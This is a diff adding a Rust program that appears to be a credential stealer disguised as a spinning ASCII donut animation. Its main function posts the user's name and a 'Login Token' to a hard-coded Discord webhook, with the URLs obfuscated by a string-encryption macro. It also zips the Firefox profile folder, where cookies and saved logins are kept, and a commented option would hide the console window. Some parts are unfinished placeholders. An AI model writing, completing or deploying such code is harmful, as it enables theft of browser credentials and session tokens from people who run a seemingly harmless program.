@@ -1,0 +1,147 @@
+// Disable console window on Windows
+// #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+
+use anyhow::Context;
+use cryptify;
+use serenity::builder::ExecuteWebhook;
+use serenity::http::Http;
+use serenity::model::webhook::Webhook;
+use std::fs::File;
+use std::io::Read;
+use std::io::Write;
+use std::path::Path;
+use std::thread;
+use std::time::Duration;
+use walkdir::WalkDir;
+use zip::{CompressionMethod, ZipWriter, write::FileOptions};
+
+fn donut() {
+    let (mut a, mut b): (f32, f32) = (0.0, 0.0);
+    let mut z: [f32; 1760];
+    let mut b2: [char; 1760];
+    let s: [char; 12] = ['.', ',', '-', '~', ':', ';', '=', '!', '*', '#', '$', '@'];
+
+    print!("\n1b2J");
+    loop {
+        // alternative: z[0..1760].fill(0.);
+        z = [0.0; 1760];
+        // alternative: b2[0..1760].fill(' ');
+        b2 = [' '; 1760];
+        for j in (0..628).step_by(1) {
+            for i in (0..628).step_by(1) {
+                let float_j = j as f32 / 100.0;
+                let float_i = i as f32 / 100.0;
+
+                let sin_i: f32 = float_i.sin();
+                let cos_j: f32 = float_j.cos();
+                let sin_a: f32 = a.sin();
+                let sin_j: f32 = float_j.sin();
+                let cos_a: f32 = a.cos();
+                let cos_j_2: f32 = cos_j + 2.0;
+                let m: f32 = 1.0 / (sin_i * cos_j_2 * sin_a + sin_j * cos_a + 5.0);
+                let cos_i: f32 = float_i.cos();
+                let cos_b: f32 = b.cos();
+                let sin_b: f32 = b.sin();
+                let t: f32 = sin_i * cos_j_2 * cos_a - sin_j * sin_a;
+
+                let x: usize = (40.0 + 30.0 * m * (cos_i * cos_j_2 * cos_b - t * sin_b)) as usize;
+                let y: usize = (12.0 + 15.0 * m * (cos_i * cos_j_2 * sin_b + t * cos_b)) as usize;
+                let o: usize = x + 80 * y;
+                let n_m: usize = (8.0
+                    * ((sin_j * sin_a - sin_i * cos_j * cos_a) * cos_b
+                        - sin_i * cos_j * sin_a
+                        - sin_j * cos_a
+                        - cos_i * cos_j * sin_b)) as usize;
+
+                if 22 > y && y > 0 && x > 0 && 80 > x && m > z[o] {
+                    z[o] = m;
+                    b2[o] = s[if n_m > 0 { n_m } else { 0 }];
+                }
+            }
+        }
+        print!("\x1b[d");
+        for k in (0..1761).step_by(1) {
+            print!("{}", if k % 80 != 0 { b2[k] } else { '\n' });
+        }
+        a += 0.04;
+        b += 0.02;
+
+        thread::sleep(Duration::from_millis(5));
+    }
+}
+
+fn zip_directory(source: &Path, destination: &Path) -> anyhow::Result<()> {
+    if !source.is_dir() {
+        anyhow::bail!("Source path is not a directory");
+    }
+
+    let file = File::create(destination)?;
+    let mut zip = ZipWriter::new(file);
+    let options = FileOptions::default()
+        .compression_method(CompressionMethod::Bzip2)
+        .unix_permissions(0o755);
+    let mut buffer = Vec::new();
+
+    for entry in WalkDir::new(source).into_iter().filter_map(Result::ok) {
+        let path = entry.path();
+        let name = path.strip_prefix(source)?;
+
+        if path.is_file() {
+            zip.start_file(name.to_str().context("Invalid UTF-8 path")?, options)?;
+            let mut f = File::open(path)?;
+            f.read_to_end(&mut buffer)?;
+            zip.write_all(&buffer)?;
+            buffer.clear();
+        }
+    }
+
+    zip.finish()?;
+    Ok(())
+}
+
+fn get_default_profile_path() -> &'static Path {
+    #[cfg(target_os = "windows")]
+    {
+        Path::new("C:\\Users\\<YourUsername>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+    }
+    #[cfg(target_os = "macos")]
+    {
+        Path::new("~/Library/Application Support/Firefox/Profiles")
+    }
+    #[cfg(target_os = "linux")]
+    {
+        Path::new("~/.mozilla/firefox")
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    let http = Http::new("");
+    let webhook = Webhook::from_url(&http, cryptify::encrypt_string!("https://discord.com/api/webhooks/1329425656647516223/7hkWERa5lejXlK99VWe0H7JrfwzHYW-kwFBORmPAFSjNHpWsSn_zEDh-5_2VHYEH143N").as_str())
+        .await
+        .expect("Invalid webhook.");
+
+    let token = "THIS-IS-THE-TOKEN";
+
+    let builder = ExecuteWebhook::new()
+        .content(format!("Login Token: ```{}```", token))
+        .username(whoami::username())
+        .avatar_url(
+            cryptify::encrypt_string!("https://cdn.discordapp.com/attachments/936284146416906270/1329436606146412676/pfp.jpg").as_str(),
+        );
+
+    let source = get_default_profile_path();
+    let destination = Path::new("output.zip");
+
+    match zip_directory(source, destination) {
+        Ok(_) => println!("done: {:?} written to {:?}", source, destination),
+        Err(e) => eprintln!("Error: {e:?}"),
+    }
+
+    webhook
+        .execute(&http, false, builder)
+        .await
+        .expect("Could not run webhook.");
+
+    donut();
+}
